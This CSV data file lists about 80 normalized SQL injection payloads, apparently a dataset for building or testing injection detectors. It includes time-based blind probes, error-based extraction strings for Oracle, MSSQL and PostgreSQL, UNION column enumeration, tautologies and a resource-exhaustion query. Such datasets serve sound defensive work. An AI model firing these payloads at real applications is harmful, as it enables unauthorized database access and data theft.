"id","payload_norm"
"901","1%"" and sleep ( 5 ) and ""%"" = """
"902","AND [RANDNUM]=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END)"
"903","-5591%"" ) ) order by 1--"
"904","select * from users WHERE username = ""1%\' ) or username = ""1 ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 5368 = 5368"""
"905","select sleep ( 5 ) -- hlgt"
"906","1' where 6035 = 6035 waitfor delay '0:0:5'--"
"907","-2568"" ) or ( 8459 = 8459 ) *4906 and ( ""exyw"" = ""exyw"
"908","select * from users WHERE username = ""-1254"" and username = ""-3899\' ) where 8152 = 8152 and username = ""1"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) """
"909","select * from users WHERE username = ""-3424\' ) ) or username = ""1%\' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and \'%\' = \'"""
"910","select * from users WHERE username = ""1\' ) ) as plbt where 4368 = 4368 or username = ""1 ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )"
"911","-2216 ) ) as hxmq where 5677 = 5677 union all select 5677,5677--"
"912","select * from users WHERE username = ""-1254"" or username = ""1\'|| ( select \'rjis\' from dual where 7696 = 7696 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) ||\'"" or username = ""1 or-- 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"""
"913","select * from users WHERE username = ""1\'+ ( select \'kicv\' where 1976 = 1976 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) +\'"" or username = ""-7199\' and username = ""-9564"
"914","select * from users WHERE username = ""1\' ) ) as eltx where 9955 = 9955 or username = ""-7242\' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and \'kfff\' = \'kfff"""
"915","select * from users WHERE username = ""-9644 ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( 5616 = 5616"" and username = ""-6720\' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )"
"916","-7083"" or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ""ajcl"" like ""ajcl"
"917","select * from users WHERE username = ""1%\' ) ) ) and ( ( ( \'%\' = \'"" and username = ""1 ) where 6039 = 6039 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"""
"918","-9644 ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( 5616 = 5616"
"919","select * from users where id = 1 or ""1]"" or 1 = 1 -- 1"
"920","1' ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( 'urxs' = 'urxs"
"921","select * from users WHERE username = ""-8021\' ) ) and ( ( \'cenk\' like \'cenk"" and username = ""1\' ) ) as wkys where 2478 = 2478"
"922","select * from users WHERE username = ""1\' ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( \'qtul\' like \'qtul"" or username = ""-2495 ) ) as hudw where 4197 = 4197"
"923","select * from users WHERE username = ""-4582 ) ) as gvfo where 8885 = 8885 and username = ""-6036 ) ) ) or username = ""-8007\' ) ) as bgpp where 9555 = 9555 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""1"""
"924","1' and ( 3435 = 7210 ) *7210 and 'lxxt' = 'lxxt"
"925","select * from users WHERE username = ""1\'+ ( select vohg where 6383 = 6383 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) +\'"" and username = ""-2783%\' ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( \'%\' = \'"""
"926","select * from users WHERE username = ""-2028%\' ) ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) or username = ""1 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) """
"927","( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( '%' = '"
"928","1 ) as ztrb where 1052 = 1052 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #"
"929","select * from users WHERE username = ""-4262%\' ) ) ) || 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( \'%\' = \'"" or username = ""1%"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )"
"930","1'|| ( select 'jfxs' from dual where 5485 = 5485 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --"
"931","1%"" or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --"
"932","-5579%"" ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ""%"" = """
"933","iif ( 7011 = 2522,1,1/0 )"
"934","select * from users WHERE username = ""-8099%\' ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) or username = ""-1254"""
"935","select * from users where id = 1 or "" ( ."" or 1 = 1 -- 1"
"936","select * from users WHERE username = ""1"" and ( ( ( \'mfmk\' = \'mfmk"" or username = ""-8163 ) ) as cvai where 2360 = 2360"
"937","select * from users WHERE username = ""1\' ) or username = ""-1254"" or username = ""-1254"" and username = ""1 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) """
"938","select * from users WHERE username = ""1%\' ) ) ) and username = ""-6190\' ) where 2621 = 2621 or-- 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""-8828%\' ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( \'%\' = \'"""
"939","select * from users WHERE username = ""1"" or username = ""-9505\' ) ) ) and ( ( ( \'qhdg\' = \'qhdg"" or username = ""-8112\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )"
"940","select * from users where username = ""-9263\' ) as qodg where 6798 = 6798 and 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --"""
"941","select * from users WHERE username = ""-1190\' and username = ""1\' ) ) as bswc where 1635 = 1635 or username = ""-9501\' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )"
"942","select * from users WHERE username = ""-9770\' ) ) as ovhh where 7903 = 7903 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --"" or username = ""1\' ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( \'bmhw\' like \'bmhw"" or username = ""1\' ) )"
"943","select * from generate_series ( 7762,7762,case when ( 7762 = 1293 ) then 1 else 0 end ) limit 1--"
"944","select * from users where username = ""-5013' ) ) ) || 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 'ehwh\' like \'ehwh"""
"945","select * from users WHERE username = ""-1639 ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 3318 = 3318"" or username = ""1 ) ) as iihk where 5414 = 5414"
"946","select * from users WHERE username = ""-6720\' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and username = ""1 and username = ""1\' )"
"947","select * from users WHERE username = ""1"" or username = ""-6190\' ) where 2621 = 2621 and username = ""-8860 ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"""
"948","1'+ ( select 'phtz' where 3171 = 3171"
"949","1'+ ( select 'ohdf' where 7878 = 7878 and 5678 = 3277--"
"950","select * from users WHERE username = ""1\' ) where 1502 = 1502 and ( ( 5616 = 5616"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and username = ""1"" and username = ""1\'+ ( select \'kicv\' where 1976 = 1976 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) +\'"""
"951","select * from users WHERE username = ""-7710\' where 5658 = 5658 or username = ""1\'+ ( select twyt where 3376 = 3376 or username = ""-2756\' where 6156 = 6156 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"""
"952","select * from users WHERE username = ""-9987 ) ) ) and 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and username = ""1 ) as zmxb where 8424 = 8424 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"""
"953","1' ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( 'rxxb' = 'rxxb"
"954","call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( '%' = '"
"955","select * from users WHERE username = ""-2756\' where 6156 = 6156 and username = ""-1549\' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( \'fnwx\' = \'fnwx"""
"956","1, ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 9693 = 9693,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )"
"957","-1084' ) union all select 2634,2634,2634,2634,2634,2634,2634,2634#"
"958","a' --"
"959","create or replace function sleep ( int ) returns int as '/lib/libc.so.6','sleep' language 'c' strict"
"960","1 ) ) as oywa where 7951 = 7951 union all select null,null,null,null,null,null#"
"961","select * from users WHERE username = ""-1854\' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""1"""
"962","select * from users WHERE username = ""1\' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( \'jzpb\' = \'jzpb"" or username = ""-9501\' )"
"963","-3215"" ) union all select 4457,4457,4457,4457,4457#"
"964","1'+ ( select bfeq where 3445 = 3445 and 9198 = 9198--"
"965","1'|| ( select 'ymre' where 8681 = 8681"
"966","1%' ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( '%' = '"
"967","-8128"" ) ) as ovjz where 7375 = 7375 union all select 7375,7375,7375,7375,7375,7375,7375,7375,7375--"
"968","select * from users WHERE username = ""1\' ) and username = ""-5863"" and ""gkvy"" = ""gkvy"" or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )"
"969","-9864"" ) or elt ( 5885 = 4936,4936 ) and ( ""bfbb"" like ""bfbb"
"970","-5207 ) where 6987 = 6987 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --"
"971","select * from users WHERE username = ""-1254"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""-9668\' ) ) as orfu where 5822 = 5822 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --"""
"972","select * from users WHERE username = ""1\' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" and ( ( 5139 = 5139"" and username = ""-8860 )"
"973","-5880' ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 'rwgl' = 'rwgl"
"974","select * from users WHERE username = ""1\'|| ( select \'yucg\' where 2576 = 2576 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) ||\'"" and username = ""-3733\' ) ) and ( ( \'ybgd\' = \'ybgd"""
"975","1%"" rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ""%"" = """
"976","select * from users WHERE username = ""1 ) where 3381 = 3381 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""1 ) as zmxb where 8424 = 8424 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"""
"977","1' ) ) as txxn where 7884 = 7884 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --"
"978","1' ) and make_set ( 9961 = 6559,6559 ) and ( 'exde' = 'exde"
"979","1' ) and 4595 = 4595#"
"980","1 ) ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --"
"981","select * from users WHERE username = ""1\' ) ) ) and username = ""1\' ) as wpmv where 1479 = 1479 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and ( ( ( 1248 = 1248"""
"982","1%"" ) ) union all select null,null,null,null,null#"
"983","select * from users WHERE username = ""1%\' and username = ""-9564 and username = ""1 or-- 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"""
